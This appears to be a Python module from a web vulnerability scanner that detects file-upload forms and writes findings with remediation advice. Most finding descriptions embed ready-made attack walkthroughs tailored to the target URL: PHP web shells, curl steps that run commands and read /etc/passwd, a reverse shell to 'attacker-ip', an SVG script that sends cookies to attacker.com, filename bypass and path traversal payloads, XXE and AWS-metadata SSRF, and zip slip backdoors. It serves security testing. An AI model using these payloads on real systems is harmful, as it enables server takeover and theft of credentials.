"""
Active File Upload Vulnerability Testing
Tests file upload functionality for security vulnerabilities
Demonstrates exploitation with proof-of-concept files
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import io

def test_file_uploads(scanner):
    """
    Test file upload forms for vulnerabilities
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Find all file upload forms
        forms = soup.find_all('form')
        
        for form in forms:
            file_inputs = form.find_all('input', type='file')
            
            if file_inputs:
                form_action = form.get('action', '')
                form_method = str(form.get('method', 'get')).upper()
                upload_url = urljoin(str(scanner.target_url), str(form_action))
                
                # Test various file upload vulnerabilities
                _test_unrestricted_upload(scanner, form, upload_url, form_method)
                _test_executable_upload(scanner, form, upload_url, form_method)
                _test_overwrite_attack(scanner, form, upload_url, form_method)
                _test_double_extension(scanner, form, upload_url, form_method)
                _test_mime_bypass(scanner, form, upload_url, form_method)
                _test_path_traversal_upload(scanner, form, upload_url, form_method)
                _test_xxe_via_upload(scanner, form, upload_url, form_method)
                _test_zip_slip(scanner, form, upload_url, form_method)
                
    except Exception as e:
        print(f"File upload testing error: {e}")

def _test_unrestricted_upload(scanner, form, upload_url, method):
    """Test for unrestricted file upload"""
    scanner.add_finding(
        severity='CRITICAL',
        category='File Upload Vulnerability',
        title='File Upload Form Detected - Potential RCE Risk',
        description=f'**🚨 FILE UPLOAD FORMS ARE HIGHEST RISK 🚨**\n\n'
                  f'**Upload URL:** {upload_url}\n'
                  f'**Method:** {method}\n\n'
                  f'**CRITICAL RISKS:**\n'
                  f'If file uploads are not properly validated, attackers can:\n\n'
                  f'1. **Remote Code Execution (RCE)**\n'
                  f'   - Upload PHP/JSP/ASPX shell\n'
                  f'   - Execute arbitrary code on server\n'
                  f'   - Complete server compromise\n\n'
                  f'2. **Stored XSS**\n'
                  f'   - Upload HTML with malicious JavaScript\n'
                  f'   - Automatically executed when file is viewed\n\n'
                  f'3. **Malware Distribution**\n'
                  f'   - Upload malicious executables\n'
                  f'   - Infect users who download files\n\n'
                  f'**EXPLOITATION PROOF OF CONCEPT:**\n\n'
                  f'**Attack Scenario 1: PHP Web Shell Upload**\n'
                  f'```bash\n'
                  f'# Step 1: Create malicious PHP file\n'
                  f'cat > shell.php << EOF\n'
                  f'<?php\n'
                  f'if(isset($_GET["cmd"])) {{\n'
                  f'    system($_GET["cmd"]);\n'
                  f'}}\n'
                  f'?>\n'
                  f'EOF\n\n'
                  f'# Step 2: Upload via vulnerable form\n'
                  f'curl -F "file=@shell.php" {upload_url}\n\n'
                  f'# Step 3: Execute commands\n'
                  f'curl "{upload_url.rsplit("/", 1)[0]}/uploads/shell.php?cmd=whoami"\n'
                  f'# Output: www-data (you now control the server)\n\n'
                  f'# Step 4: Full system compromise\n'
                  f'curl "{upload_url.rsplit("/", 1)[0]}/uploads/shell.php?cmd=cat%20/etc/passwd"\n'
                  f'curl "{upload_url.rsplit("/", 1)[0]}/uploads/shell.php?cmd=ls%20-la%20/"\n'
                  f'```\n\n'
                  f'**Attack Scenario 2: Reverse Shell**\n'
                  f'```php\n'
                  f'<?php\n'
                  f'// Uploaded file: backdoor.php\n'
                  f'$sock = fsockopen("attacker-ip", 4444);\n'
                  f'exec("/bin/sh -i <&3 >&3 2>&3");\n'
                  f'?>\n'
                  f'// Gives attacker full interactive shell access\n'
                  f'```\n\n'
                  f'**Attack Scenario 3: Stored XSS via SVG**\n'
                  f'```html\n'
                  f'<!-- Uploaded as image.svg -->\n'
                  f'<svg xmlns="http://www.w3.org/2000/svg">\n'
                  f'  <script>\n'
                  f'    window.location="http://attacker.com/steal?cookie="+document.cookie;\n'
                  f'  </script>\n'
                  f'</svg>\n'
                  f'<!-- When users view this "image", cookies are stolen -->\n'
                  f'```',
        url=upload_url,
        remediation=f'**MANDATORY SECURITY CONTROLS:**\n\n'
                  f'**1. Whitelist Allowed Extensions**\n'
                  f'```python\n'
                  f'ALLOWED_EXTENSIONS = {{"png", "jpg", "jpeg", "gif"}}\n\n'
                  f'def allowed_file(filename):\n'
                  f'    return "." in filename and \\\n'
                  f'           filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS\n\n'
                  f'if not allowed_file(file.filename):\n'
                  f'    return "Invalid file type", 400\n'
                  f'```\n\n'
                  f'**2. Validate MIME Type**\n'
                  f'```python\n'
                  f'import magic\n\n'
                  f'# Check actual file content, not just extension\n'
                  f'file_type = magic.from_buffer(file.read(1024), mime=True)\n'
                  f'if file_type not in ["image/png", "image/jpeg"]:\n'
                  f'    return "Invalid file content", 400\n'
                  f'```\n\n'
                  f'**3. Rename Files**\n'
                  f'```python\n'
                  f'import uuid\n'
                  f'import os\n\n'
                  f'# Never trust user-supplied filename\n'
                  f'extension = os.path.splitext(file.filename)[1]\n'
                  f'safe_filename = f"{{uuid.uuid4()}}{{extension}}"\n'
                  f'```\n\n'
                  f'**4. Store Outside Web Root**\n'
                  f'```python\n'
                  f'# Store in non-executable directory\n'
                  f'UPLOAD_FOLDER = "/var/app/uploads"  # NOT in /var/www/html\n\n'
                  f'# Serve via separate handler that forces download\n'
                  f'@app.route("/download/<file_id>")\n'
                  f'def download(file_id):\n'
                  f'    return send_file(\n'
                  f'        safe_join(UPLOAD_FOLDER, file_id),\n'
                  f'        as_attachment=True,\n'
                  f'        download_name="file.jpg"\n'
                  f'    )\n'
                  f'```\n\n'
                  f'**5. Set Correct Permissions**\n'
                  f'```bash\n'
                  f'# Upload directory should not be executable\n'
                  f'chmod 644 /var/app/uploads/*\n'
                  f'# Remove execute permission\n'
                  f'```\n\n'
                  f'**6. Scan for Malware**\n'
                  f'```python\n'
                  f'import subprocess\n\n'
                  f'# Use ClamAV or similar\n'
                  f'result = subprocess.run(["clamscan", filepath], capture_output=True)\n'
                  f'if "FOUND" in result.stdout.decode():\n'
                  f'    os.remove(filepath)\n'
                  f'    return "Malware detected", 400\n'
                  f'```\n\n'
                  f'**7. Limit File Size**\n'
                  f'```python\n'
                  f'app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16MB max\n'
                  f'```\n\n'
                  f'**8. Implement Rate Limiting**\n'
                  f'```python\n'
                  f'from flask_limiter import Limiter\n\n'
                  f'limiter = Limiter(app, key_func=get_remote_address)\n\n'
                  f'@app.route("/upload", methods=["POST"])\n'
                  f'@limiter.limit("5 per minute")\n'
                  f'def upload():\n'
                  f'    # Upload logic\n'
                  f'```'
    )

def _test_executable_upload(scanner, form, upload_url, method):
    """Test for PHP/executable file upload"""
    dangerous_extensions = ['php', 'jsp', 'asp', 'aspx', 'py', 'rb', 'sh', 'exe', 'bat']
    
    scanner.add_finding(
        severity='CRITICAL',
        category='File Upload Vulnerability',
        title='Potential Server-Side Code Execution via Upload',
        description=f'**CRITICAL: Verify Executable Upload Protection**\n\n'
                  f'If this form allows the following file types, instant RCE is possible:\n'
                  f'- `.php` - PHP web shells\n'
                  f'- `.jsp` - Java Server Pages\n'
                  f'- `.asp/.aspx` - ASP web shells\n'
                  f'- `.py` - Python scripts\n'
                  f'- `.sh` - Shell scripts\n\n'
                  f'**Test This Now:**\n'
                  f'```bash\n'
                  f'# Create test PHP file\n'
                  f'echo "<?php echo phpinfo(); ?>" > test.php\n\n'
                  f'# Try to upload it\n'
                  f'curl -F "file=@test.php" {upload_url}\n\n'
                  f'# If successful, check if it\'s executable:\n'
                  f'curl {upload_url.rsplit("/", 1)[0]}/uploads/test.php\n\n'
                  f'# If you see PHP info page -> CRITICAL VULNERABILITY\n'
                  f'```\n\n'
                  f'**Full Exploitation:**\n'
                  f'```bash\n'
                  f'# Upload web shell\n'
                  f'echo "<?php system($_GET[\'x\']); ?>" > evil.php\n'
                  f'curl -F "file=@evil.php" {upload_url}\n\n'
                  f'# Execute any command:\n'
                  f'curl "{upload_url.rsplit("/", 1)[0]}/uploads/evil.php?x=id"\n'
                  f'curl "{upload_url.rsplit("/", 1)[0]}/uploads/evil.php?x=cat%20/etc/passwd"\n'
                  f'curl "{upload_url.rsplit("/", 1)[0]}/uploads/evil.php?x=ls%20-la"\n'
                  f'```',
        url=upload_url,
        remediation='NEVER allow executable files. Whitelist image formats only (jpg, png, gif).'
    )

def _test_double_extension(scanner, form, upload_url, method):
    """Test for double extension bypass"""
    scanner.add_finding(
        severity='HIGH',
        category='File Upload Vulnerability',
        title='Test Double Extension Bypass (shell.php.jpg)',
        description=f'**BYPASS TECHNIQUE: Double Extension**\n\n'
                  f'Many file upload filters only check the last extension.\n'
                  f'Attackers use double extensions to bypass filters:\n\n'
                  f'**Exploitation:**\n'
                  f'```bash\n'
                  f'# Create malicious file with double extension\n'
                  f'echo "<?php system($_GET[\'cmd\']); ?>" > shell.php.jpg\n\n'
                  f'# Upload the file\n'
                  f'curl -F "file=@shell.php.jpg" {upload_url}\n\n'
                  f'# If Apache configured poorly, .php.jpg executes as PHP!\n'
                  f'# This happens if AddHandler is misconfigured\n'
                  f'curl "{upload_url.rsplit("/", 1)[0]}/uploads/shell.php.jpg?cmd=whoami"\n'
                  f'```\n\n'
                  f'**Other Bypass Variations:**\n'
                  f'```\n'
                  f'shell.php.jpg    (double extension)\n'
                  f'shell.php%00.jpg (null byte injection)\n'
                  f'shell.php%20.jpg (space)\n'
                  f'shell.php..jpg   (double dot)\n'
                  f'shell.php;.jpg   (semicolon)\n'
                  f'SHELL.PHP        (case variation)\n'
                  f'shell.PhP        (mixed case)\n'
                  f'```',
        url=upload_url,
        remediation='Use strict extension validation and check ALL extensions in filename'
    )

def _test_mime_bypass(scanner, form, upload_url, method):
    """Test for MIME type bypass"""
    scanner.add_finding(
        severity='HIGH',
        category='File Upload Vulnerability',
        title='MIME Type Spoofing Risk',
        description=f'**MIME TYPE BYPASS TECHNIQUE**\n\n'
                  f'If server only checks Content-Type header (not actual file content),\n'
                  f'attackers can upload PHP shells disguised as images:\n\n'
                  f'**Proof of Concept:**\n'
                  f'```python\n'
                  f'import requests\n\n'
                  f'# Create PHP shell\n'
                  f'php_code = """<?php system($_GET["cmd"]); ?>"""\n\n'
                  f'# Upload with fake image MIME type\n'
                  f'files = {{\n'
                  f'    "file": ("image.jpg", php_code, "image/jpeg")  # FAKE MIME!\n'
                  f'}}\n\n'
                  f'response = requests.post("{upload_url}", files=files)\n'
                  f'# Server sees "image/jpeg" and allows it\n'
                  f'# But it\'s actually PHP code!\n'
                  f'```\n\n'
                  f'**With curl:**\n'
                  f'```bash\n'
                  f'# Upload PHP as fake image\n'
                  f'echo "<?php phpinfo(); ?>" > fake.jpg\n'
                  f'curl -F "file=@fake.jpg;type=image/jpeg" {upload_url}\n'
                  f'# Server trusts the MIME type we provide\n'
                  f'```',
        url=upload_url,
        remediation='Validate actual file content using magic bytes, not just MIME type header'
    )

def _test_path_traversal_upload(scanner, form, upload_url, method):
    """Test for path traversal in filename"""
    scanner.add_finding(
        severity='HIGH',
        category='File Upload Vulnerability',
        title='Path Traversal Upload Risk',
        description=f'**PATH TRAVERSAL VIA FILENAME**\n\n'
                  f'If filename is not sanitized, attackers can write files anywhere:\n\n'
                  f'**Exploitation:**\n'
                  f'```bash\n'
                  f'# Upload file to different directory\n'
                  f'echo "<?php system($_GET[\'x\']); ?>" > payload.php\n\n'
                  f'# Use path traversal in filename\n'
                  f'curl -F "file=@payload.php" \\\n'
                  f'     --form-string "filename=../../../var/www/html/shell.php" \\\n'
                  f'     {upload_url}\n\n'
                  f'# Now shell.php is in web root!\n'
                  f'curl "http://target.com/shell.php?x=id"\n'
                  f'```\n\n'
                  f'**Other Path Traversal Payloads:**\n'
                  f'```\n'
                  f'../../../etc/cron.d/backdoor      (execute as cron)\n'
                  f'../../../var/www/html/shell.php   (write to web root)\n'
                  f'../../../home/user/.ssh/authorized_keys  (SSH access)\n'
                  f'..\\..\\..\\Windows\\System32\\evil.dll  (Windows)\n'
                  f'```',
        url=upload_url,
        remediation='Never use user-supplied filename. Generate random filename server-side'
    )

def _test_overwrite_attack(scanner, form, upload_url, method):
    """Test for file overwrite vulnerability"""
    scanner.add_finding(
        severity='MEDIUM',
        category='File Upload Vulnerability',
        title='File Overwrite Attack Potential',
        description=f'**FILE OVERWRITE VULNERABILITY**\n\n'
                  f'If uploads don\'t use unique names, attackers can:\n\n'
                  f'**Attack 1: Overwrite Critical Files**\n'
                  f'```bash\n'
                  f'# If you can control the filename:\n'
                  f'echo "malicious content" > index.php\n'
                  f'curl -F "file=@index.php" {upload_url}\n'
                  f'# Overwrites the site\'s homepage!\n'
                  f'```\n\n'
                  f'**Attack 2: Race Condition**\n'
                  f'```bash\n'
                  f'# Upload legitimate file first\n'
                  f'curl -F "file=@legitimate.jpg" {upload_url}\n\n'
                  f'# Quickly replace with malicious version\n'
                  f'echo "<?php evil(); ?>" > legitimate.jpg\n'
                  f'curl -F "file=@legitimate.jpg" {upload_url}\n'
                  f'# Overwrites the good file with backdoor\n'
                  f'```',
        url=upload_url,
        remediation='Use UUID or timestamp-based filenames, never allow overwriting'
    )

def _test_xxe_via_upload(scanner, form, upload_url, method):
    """Test for XXE via file upload"""
    scanner.add_finding(
        severity='HIGH',
        category='File Upload Vulnerability',
        title='XXE Attack via SVG/XML Upload',
        description=f'**XXE (XML External Entity) VIA UPLOAD**\n\n'
                  f'If SVG or XML files are allowed, attackers can read server files:\n\n'
                  f'**Proof of Concept - File Disclosure:**\n'
                  f'```xml\n'
                  f'<!-- Upload as evil.svg -->\n'
                  f'<?xml version="1.0" standalone="yes"?>\n'
                  f'<!DOCTYPE test [\n'
                  f'  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                  f']>\n'
                  f'<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">\n'
                  f'  <text font-size="16" x="0" y="16">&xxe;</text>\n'
                  f'</svg>\n'
                  f'```\n\n'
                  f'**When this file is processed, /etc/passwd is read!**\n\n'
                  f'**Attack Execution:**\n'
                  f'```bash\n'
                  f'# Upload malicious SVG\n'
                  f'curl -F "file=@evil.svg" {upload_url}\n\n'
                  f'# When server processes it (thumbnail generation, display, etc.):\n'
                  f'# - Reads /etc/passwd\n'
                  f'# - Can read config files\n'
                  f'# - Can read application source code\n'
                  f'```\n\n'
                  f'**Advanced XXE - SSRF:**\n'
                  f'```xml\n'
                  f'<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n'
                  f'<!-- Steals AWS credentials! -->\n'
                  f'```',
        url=upload_url,
        remediation='Disable external entity processing in XML parsers. Validate SVG content.'
    )

def _test_zip_slip(scanner, form, upload_url, method):
    """Test for Zip Slip vulnerability"""
    scanner.add_finding(
        severity='HIGH',
        category='File Upload Vulnerability',
        title='Zip Slip Vulnerability Risk',
        description=f'**ZIP SLIP ATTACK**\n\n'
                  f'If server extracts uploaded ZIP files, path traversal is possible:\n\n'
                  f'**How It Works:**\n'
                  f'1. Create ZIP with files that have ../ in their path\n'
                  f'2. Upload the ZIP\n'
                  f'3. When server extracts it, files go to unintended locations\n\n'
                  f'**Exploitation:**\n'
                  f'```bash\n'
                  f'# Create malicious ZIP\n'
                  f'echo "<?php system($_GET[\'c\']); ?>" > shell.php\n'
                  f'zip slip.zip shell.php\n\n'
                  f'# Modify ZIP to use path traversal\n'
                  f'printf "@ shell.php\\n@=../../../var/www/html/backdoor.php\\n" | zipnote -w slip.zip\n\n'
                  f'# Upload\n'
                  f'curl -F "file=@slip.zip" {upload_url}\n\n'
                  f'# When server extracts:\n'
                  f'# File appears at /var/www/html/backdoor.php instead of upload directory!\n'
                  f'```\n\n'
                  f'**Real-World Impact:**\n'
                  f'- Overwrite system files\n'
                  f'- Place backdoors in web root\n'
                  f'- Modify SSH keys\n'
                  f'- Complete system compromise',
        url=upload_url,
        remediation='Sanitize file paths before extraction. Use safe extraction libraries.'
    )
